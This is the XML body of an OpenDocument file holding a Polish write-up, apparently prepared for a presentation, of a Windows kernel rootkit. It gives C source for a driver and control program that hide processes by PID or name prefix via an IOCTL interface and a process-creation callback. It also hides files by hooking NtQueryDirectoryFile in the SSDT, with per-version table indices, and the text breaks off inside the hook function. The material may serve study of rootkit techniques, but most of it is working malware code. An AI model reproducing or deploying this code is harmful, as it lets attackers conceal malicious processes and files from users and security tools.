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, Courier, mono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background-color="#ffffff">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true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style:text-autospace="none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 style:list-style-name="L2"/>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="List_20_Heading">
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="List_20_Contents">
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="List_20_Contents">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm"/>
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt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 style:list-style-name="L4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 style:list-style-name="L4"/>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:text-properties fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:text-properties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 style:list-style-name="L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 style:list-style-name="L5"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ff" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex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style:use-window-font-color="true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/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Courier New" fo:font-size="10pt" fo:font-weight="bold" fo:background-color="#ffffff" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Courier New" fo:font-size="10pt" fo:background-color="#ffffff" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Courier New" fo:font-size="10pt" fo:font-style="italic" fo:background-color="#ffffff" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-style="italic"/>
    </style:style>
    <style:style style:name="Sect1" style:family="section">
      <style:section-properties fo:margin-left="0cm" fo:margin-right="0cm"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2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4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6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9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1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2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8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0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3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3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6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7cm" text:min-label-width="0.635cm"/>
        <style:text-properties style:font-name="StarSymbol"/>
      </text:list-level-style-bullet>
    </text:list-style>
    <text:list-style style:name="L3">
      <text:list-level-style-number text:level="1" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="2" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="3" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="4" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="5" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="6" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="7" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="8" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="9" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number>
      <text:list-level-style-number text:level="10" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:list-level-style-number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21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42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6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8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0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27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24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69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89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RCHITEKTURA:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:tab/>Ten rootkit składa sie z dwóch części:</text:p>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P2">sterownika – zawiera główną funkcjonalność rootkita, działa w kernel mode(ring0) .</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P2">Aplikacji sterującej działającej w user-mode (ring3)</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:tab/>Rootkit może być uruchamiany przy starcie, ale ponieważ na innym systemie mogą wystąpić błędy spowodowane różnica w konfiguracji (inne struktury, indeksy funkcji w ssdt), lepiej </text:p>
      <text:p text:style-name="Standard">przynajmniej pierwszy raz uruchomić rootkita tylko na czas działania systemu (nie uruchomi sie przy starcie). W innym przypadku źle działający rootkit może uniemożliwić normalne uruchomienie systemu. Gdyby sie tak stało można to ominąć poprzez uruchomienie systemu z konsola odzyskiwania i usuniecie sterownika – komendy listsvc ( wyświetla usługi/drivery), disable &lt;nazwa_drivera&gt; - wyinstalowuje sterownik, albo uruchamiając komputer pod kontrola innego systemu i wykasowanie sterownika z dysku.</text:p>
      <text:p text:style-name="Standard"><text:tab/>Według mnie dla potrzeb prezentacji lepiej nie uruchamiać rootkita przy starcie, tylko podczas działania systemu – będzie można go wielokrotnie ładować i wyładowywać i obserwować działanie systemu bez i z rootkitem.</text:p>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/>Aplikacja sterująca służy do załadowania drivera oraz do komunikacji z nim. W tej chwili komunikacja jest bardzo uproszczona. Istnieje tylko jedna obsługiwana metoda - ukrywanie procesów po zadanym PID'zie Żeby ukryć proces uruchom:</text:p>
      <text:p text:style-name="Standard"><text:tab/>rootkit.exe h &lt;pid_procesu&gt;</text:p>
      <text:p text:style-name="Standard"><text:tab/>Proces zniknie z listy działających procesów menadżera zadań, oraz każdej innej aplikacji opierającej listowanie procesów o Windows API czy NativeAPI.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P1">1.1 Komuikacja:</text:p>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/>Komunikacja ze sterownikiem odbywa się za pomocą pakietów IRP. Jest to odpowiednik komunikatów w aplikacjach Windowsowych, lecz o znacznie bogatszych możliwościach.</text:p>
      <text:p text:style-name="Standard"><text:tab/>Rootkit obsługuje pakiety IRP od naszej aplikacji w specjalnie w tym celu zarejstrowanej procedurze Driver_IoControl:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P3">// procedura zwraca status (rozbudowany typ bardzo często używany do zwracania wartosci sterownikach w Windows).</text:p>
      <text:p text:style-name="P4">NTSTATUS <text:s/>Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )</text:p>
      <text:p text:style-name="P5">{</text:p>
      <text:p text:style-name="P5"><text:tab/>NTSTATUS status = STATUS_SUCCESS;</text:p>
      <text:p text:style-name="P5"><text:tab/>PIO_STACK_LOCATION irpStack;</text:p>
      <text:p text:style-name="P5"><text:tab/>ULONG inputSize;</text:p>
      <text:p text:style-name="P5"><text:tab/>ULONG controlCode;</text:p>
      <text:p text:style-name="P5"><text:tab/>PVOID pInputBuffer;</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6"><text:tab/>// pobieramy informacje o pakiecie IRP</text:p>
      <text:p text:style-name="P5"><text:tab/>irpStack = IoGetCurrentIrpStackLocation( Irp );</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6"><text:tab/>// kod rozróznia dokladnie, o który komunikat nam chodzi ( my obslugujemy <text:s/>IOCTL_HIDE_PROCESS)</text:p>
      <text:p text:style-name="P5"><text:tab/>controlCode = irpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6"><text:tab/>// ilosc bajtow które zostaly przyslane w tym pakiecie IRP</text:p>
      <text:p text:style-name="P5"><text:tab/>inputSize = irpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</text:p>
      <text:p text:style-name="P6"><text:tab/>// wskaznik na bufor danych odebranych w tym pakiecie</text:p>
      <text:p text:style-name="P5"><text:tab/>pInputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer;</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><text:tab/>switch (controlCode) </text:p>
      <text:p text:style-name="P5"><text:tab/>{</text:p>
      <text:p text:style-name="P5"><text:tab/>case IOCTL_HIDE_PROCESS:</text:p>
      <text:p text:style-name="P5"><text:tab/><text:tab/>if (inputSize == sizeof(ULONG)) {</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>// w pakiecie znajdowalo sie jedna podwojne slowo (zmienna typu DWORD)</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>// w sterownikach uzywa sie typu ULONG tego samego rozmiaru</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>// przetypowujemy wskaznik na wskaznik do ULONG i wyluskujemy spod tego </text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>// wskaznika PID procesu , który zamierzamy ukryc</text:p>
      <text:p text:style-name="P5"><text:tab/><text:tab/><text:tab/>OnProcessHide( *(ULONG*)pInputBuffer );</text:p>
      <text:p text:style-name="P5"><text:tab/><text:tab/>}</text:p>
      <text:p text:style-name="P5"><text:tab/><text:tab/>break;</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><text:tab/>default:</text:p>
      <text:p text:style-name="P5"><text:tab/><text:tab/>break;</text:p>
      <text:p text:style-name="P5"><text:tab/>}<text:tab/></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6"><text:tab/>// po obsluzeniu pakietu IRP trzeba zwrocic do systemu informacje czy operacja sie powiodla czy nie</text:p>
      <text:p text:style-name="P6"><text:tab/>// my zawsze zwracamy STATUS_SUCCESS (ustawiony na poczatku)</text:p>
      <text:p text:style-name="P5"><text:tab/>Irp-&gt;IoStatus.Status = status;</text:p>
      <text:p text:style-name="P5"><text:tab/>Irp-&gt;IoStatus.Information = 0;</text:p>
      <text:p text:style-name="P5"><text:tab/>IoCompleteRequest( Irp , IO_NO_INCREMENT );</text:p>
      <text:p text:style-name="P5"><text:tab/>return status;</text:p>
      <text:p text:style-name="P5">}</text:p>
      <text:p text:style-name="P7">Tak wyglada komunikacja od strony sterownika (kernel-mode).</text:p>
      <text:p text:style-name="P7">Od strony aplikacji wyglada to nastepujaco:</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:span text:style-name="T1">bool</text:span><text:span text:style-name="T2"> HideProcess(DWORD pid)</text:span></text:p>
      <text:p text:style-name="P8">{</text:p>
      <text:p text:style-name="P8"><text:tab/>DWORD dwReturn;</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P9"><text:tab/>// otwarcie urzadzenia rootkita</text:p>
      <text:p text:style-name="P8"><text:tab/>hDevice = CreateFile(</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/><text:tab/>"\\\\.\\rootkitDrv", </text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/><text:tab/>GENERIC_READ | GENERIC_WRITE,</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/><text:tab/>FILE_SHARE_READ, NULL,</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/><text:tab/>OPEN_EXISTING,</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/><text:tab/>FILE_ATTRIBUTE_NORMAL,</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/><text:tab/>NULL);</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P11"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T1">if</text:span><text:span text:style-name="T2"> ( !hDevice ) </text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T2"><text:tab/><text:tab/></text:span><text:span text:style-name="T1">return</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T1">false</text:span><text:span text:style-name="T2">;</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P9"><text:tab/>// wyslanie pakietu IRP_MJ_DEVICE_CONTROL o kodzie IOCTL_HIDE_PROCESS,</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T3"><text:tab/>// kod ten jest utworzony przez specjalne makro </text:span>CTL_CODE<text:span text:style-name="T3"> po podaniu odpowiednich parametrow - </text:span></text:p>
      <text:p text:style-name="P9"><text:tab/>// takich samych w kodzie rootkita i aplikacji w user mode</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T1">if</text:span><text:span text:style-name="T2"> (!DeviceIoControl(hDevice, </text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>IOCTL_HIDE_PROCESS, </text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>&amp;pid,<text:tab/><text:tab/><text:tab/>// wysylamy zmienna pid</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T2"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T1">sizeof</text:span><text:span text:style-name="T2">(pid), <text:tab/><text:tab/>// rozmiar zmiennej</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>NULL, <text:tab/><text:tab/><text:tab/>// nie odczytujemy nic pusty wskaznik</text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>0, <text:tab/><text:tab/><text:tab/>// zero bajtow do czytania</text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>&amp;dwReturn, </text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>NULL))</text:p>
      <text:p text:style-name="P8"><text:tab/>{</text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/>printf("Blad podczas komunikacji z rootkitem\n");</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T2"><text:tab/><text:tab/></text:span><text:span text:style-name="T1">return</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T1">false</text:span><text:span text:style-name="T2">;</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/>}</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:tab/>CloseHandle( hDriver );</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P11"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T1">return</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T1">true</text:span><text:span text:style-name="T2">;</text:span></text:p>
      <text:p text:style-name="P8">}</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">2 FUNCJONALNOSC:</text:p>
      <text:p text:style-name="Standard"/>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P13"><text:span text:style-name="T4">chowanie procesów po nazwie</text:span>. </text:p>
              <text:p text:style-name="P13">Każde utworzenie ( i zamkniecie) procesu jest rejestrowane przez rootkita. Wyłapując ten moment możemy sprawdzić nazwę uruchamianego procesu i ukryć go jeżeli nazwa pasuje do wzorca.<text:tab/> <text:s/><text:tab/></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P13">Rootkit rejestruje procedurę typu callback <text:s text:c="3"/>- wywoływana przez inny kod ( w tym przypadku system) podczas zaistnienia pewnych warunków (informacja z DDK):</text:p>
              <text:p text:style-name="P13"/>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"><text:tab/>The <text:span text:style-name="T5">PsSetCreateProcessNotifyRoutine</text:span> routine adds a driver-supplied callback routine to, or removes it from, <text:tab/>a list of routines to be called whenever a process is created or deleted. </text:p>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P14"/>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P15"><text:span text:style-name="T6"><text:tab/>NTSTATUS</text:span><text:span text:style-name="T7"><text:line-break/><text:tab/></text:span><text:span text:style-name="T6">PsSetCreateProcessNotifyRoutine(</text:span><text:span text:style-name="T7"><text:line-break/><text:tab/>    </text:span><text:span text:style-name="T6">IN PCREATE_PROCESS_NOTIFY_ROUTINE</text:span><text:span text:style-name="T7">  </text:span><text:span text:style-name="T8">NotifyRoutine</text:span><text:span text:style-name="T6">,</text:span><text:span text:style-name="T7"><text:line-break/><text:tab/>    </text:span><text:span text:style-name="T6">IN BOOLEAN</text:span><text:span text:style-name="T7">  </text:span><text:span text:style-name="T8">Remove</text:span><text:span text:style-name="T7"><text:line-break/><text:tab/>    </text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:section text:style-name="Sect1" text:name="reftip">
        <text:p text:style-name="Text_20_body"/>
      </text:section>
      <text:h text:style-name="P16" text:outline-level="4">Parameters</text:h>
      <text:p text:style-name="P17"><text:span text:style-name="T9"><text:tab/>NotifyRoutine</text:span> </text:p>
      <text:p text:style-name="P18"><text:tab/>Specifies the entry point of a caller-supplied process-creation callback routine. </text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T9"><text:tab/>Remove</text:span> </text:p>
      <text:p text:style-name="P19"><text:tab/>Indicates whether the routine specified by <text:span text:style-name="T9">NotifyRoutine</text:span> should be added to or removed from the <text:tab/>system's list of notification routines. If FALSE, the specified routine is added to the list. If TRUE, the <text:tab/>specified routine is removed from the list.</text:p>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P14"/>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P20"><text:tab/><text:tab/>Korzystając z tej funkcji rejestrujemy procedurę:</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P4">VOID ProcessNotify(<text:tab/>IN HANDLE <text:s/>hParentId, <text:tab/>IN HANDLE <text:s/>hProcessId, <text:tab/>IN BOOLEAN bCreate<text:tab/>)</text:p>
      <text:p text:style-name="P4">{</text:p>
      <text:p text:style-name="P4"><text:s text:c="4"/>PEPROCESS eproc = NULL;</text:p>
      <text:p text:style-name="P4"><text:s text:c="4"/>PCHAR processName = NULL;</text:p>
      <text:p text:style-name="P4"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P4"><text:s text:c="4"/>if (bCreate) {</text:p>
      <text:p text:style-name="P21"><text:s text:c="7"/>// ta funkcja zwróci nam blok EPROCESS dla procesu o zadanym PIDdzie.</text:p>
      <text:p text:style-name="P4"><text:s text:c="7"/>PsLookupProcessByProcessId( hProcessId , &amp;eproc );</text:p>
      <text:p text:style-name="P4"><text:s text:c="7"/>if (eproc != NULL) {</text:p>
      <text:p text:style-name="P4"><text:tab/>ULONG len = 0;</text:p>
      <text:p text:style-name="P4"><text:tab/>len = strlen(rulingProcess);</text:p>
      <text:p text:style-name="P21"><text:tab/>// odczytanie nazwy procesu – znajduje się pod offsetem = processName w strukturze EPROCESS </text:p>
      <text:p text:style-name="P4"><text:tab/>processName = (PCHAR) ( (ULONG)eproc + offsets.processName);</text:p>
      <text:p text:style-name="P4"><text:tab/>if (processName!= NULL) {</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>if (strlen(processName) &gt;= len) {</text:p>
      <text:p text:style-name="P21"><text:tab/><text:tab/><text:tab/>// porównanie nazw procesu ze wzorem</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>if (RtlCompareMemory( processName, rulingProcess, len ) == len)</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/><text:tab/>// jeśli pierwsze len bajtów sa takie same to chowamy proces!</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/><text:tab/>OnProcessHide( (ULONG)hProcessId );</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>}</text:p>
      <text:p text:style-name="P4"><text:tab/>}</text:p>
      <text:p text:style-name="P4"><text:s text:c="7"/>}</text:p>
      <text:p text:style-name="P4"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P22">ukrywanie procesu po PID:</text:p>
              <text:p text:style-name="P23">Szczegółowy opis w opisie komunikacji powyżej.</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P22">Ukrywanie plików:</text:p>
              <text:p text:style-name="P23">Do ukrywania plików wykorzystujemy Native API hooking. Funkcję, którą przechwytujemy jest NtQueryDirectoryFile. Wszystkie mechanizmy Windows API, listujące listę plików i podkatalogów w aktualnym katalogu korzystają z tej fukcji. Funkcja ta jest usługa systemu (System Service – nie mylić z programem typu usługa).</text:p>
              <text:p text:style-name="P23">Windows przechowuje adresy do takich kluczowych funkcji systemu w specjalnej tablicy SSDT – System Service Descriptor Table. Jest to więc tablica wskaźników na te funkcje. Funkcje znajdują się pod ściśle określonymi indeksami w tablicy, przy czym indeksy te mogą się zmienić nawet z nowym service-packiem. Ntoskrn.exe (jądro systemu Windows) eksportuje wskaźnik do SSDT za pomocą zmiennej:</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P23">PSERVICE_DESCRIPTOR_TABLE <text:s text:c="2"/>KeServiceDescriptorTable;</text:p>
              <text:p text:style-name="P23"/>
              <text:p text:style-name="P23">Rootkit przechowuje indeksy dla dwóch przechwytywanych funkcji w specjalnie w tym celu zdefiniowanej tablicy. Są tam indeksy dla kilku wersji systemu Windows (Win2k, Win XP, Win2k3).</text:p>
              <text:p text:style-name="P23"/>
              <text:p text:style-name="P24">typedef struct {</text:p>
              <text:p text:style-name="P24"><text:tab/>ULONG<text:tab/><text:tab/>NtCreateFileIndex;</text:p>
              <text:p text:style-name="P24"><text:tab/>ULONG<text:tab/><text:tab/>NtQueryDirectoryFileIndex;</text:p>
              <text:p text:style-name="P24">} API_INDEXES, *PAPI_INDEXES;</text:p>
              <text:p text:style-name="P24"/>
              <text:p text:style-name="P24">// indeksy w tablicy ssdt gdzie znajduja sie uslugi, ktore chcemy przechwycic</text:p>
              <text:p text:style-name="P24">API_INDEXES API_2K <text:s text:c="2"/>= <text:s text:c="4"/>{ 0x20, 0x7D };</text:p>
              <text:p text:style-name="P24">API_INDEXES API_XP <text:s text:c="2"/>=<text:tab/> <text:s/>{ 0x25, 0x91 };</text:p>
              <text:p text:style-name="P24">API_INDEXES API_2K3 <text:s/>=<text:tab/> <text:s/>{ 0x27, 0x97 }; </text:p>
              <text:p text:style-name="P24"/>
              <text:p text:style-name="P24"/>
            </text:list-header>
            <text:list-item>
              <text:p text:style-name="P25">Znając adres tej tablicy oraz indeks interesującej nas funkcji możemy ją przechwycić podmieniając adres tej funkcji znajdujący się określonym miejscu w tablicy.</text:p>
              <text:p text:style-name="P25">W rootkicie użyłem przyjaznego macro:</text:p>
              <text:p text:style-name="P25"/>
              <text:p text:style-name="P24">#define SYSCALL(_index) <text:s/>((PSRVTABLE) KeServiceDescriptorTable)-&gt;ServiceTable[ _index ]</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P25">fragment kodu przechwytujący <text:s/>NtQueryDirectoryFile:</text:p>
              <text:p text:style-name="P24">...</text:p>
              <text:p text:style-name="P26">// NtQueryDirectoryFile</text:p>
              <text:p text:style-name="P26">// odczytujemy aktualny wskaźnik (zachowujemy żeby moc odhookować system przy wyjściu)</text:p>
              <text:p text:style-name="P24">OldNtQueryDirectoryFile<text:tab/>= SYSCALL( currentAPI.NtQueryDirectoryFileIndex );</text:p>
              <text:p text:style-name="P26">// właściwa podmiana adresu funkcji na zdefiniowaną przez nas <text:s/>HookNtQueryDirectoryFile</text:p>
              <text:p text:style-name="P24">SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = HookNtQueryDirectoryFile;</text:p>
              <text:p text:style-name="P24">...</text:p>
              <text:p text:style-name="P24"/>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P4"><text:tab/>NTSTATUS HookNtQueryDirectoryFile(</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN HANDLE hFile,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN HANDLE hEvent OPTIONAL,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN PVOID IoApcContext OPTIONAL,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>OUT PIO_STATUS_BLOCK pIoStatusBlock,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>OUT PVOID FileInformationBuffer,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN ULONG FileInformationBufferLength,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN FILE_INFORMATION_CLASS FileInfoClass,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN BOOLEAN bReturnOnlyOneEntry,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN PUNICODE_STRING PathMask OPTIONAL,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>IN BOOLEAN bRestartQuery</text:p>
      <text:p text:style-name="P4">)</text:p>
      <text:p text:style-name="P4">{</text:p>
      <text:p text:style-name="P4"><text:tab/>NTSTATUS rc;</text:p>
      <text:p text:style-name="P4"><text:tab/>PCHAR processName = NULL;</text:p>
      <text:p text:style-name="P4"><text:tab/>PEPROCESS currentEprocess = NULL;<text:tab/></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>// wywołanie oryginalnej funkcji</text:p>
      <text:p text:style-name="P4"><text:tab/>rc=OldNtQueryDirectoryFile(</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>hFile,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>hEvent,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>IoApcRoutine,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>IoApcContext,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>pIoStatusBlock,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>FileInformationBuffer,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>FileInformationBufferLength,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>FileInfoClass,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>bReturnOnlyOneEntry,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>PathMask,</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>bRestartQuery);</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>// teraz w <text:s/>FileInformationBuffer znajdują się informacje o zawartości katalogu</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>if ( nazwa_aktualnego_procesu_zaczyna_sie_od_master )</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>// wychodzimy z funkcji nie modyfikując bufora <text:s/>FileInformationBuffer</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>return rc;</text:p>
      <text:p text:style-name="P4"><text:tab/></text:p>
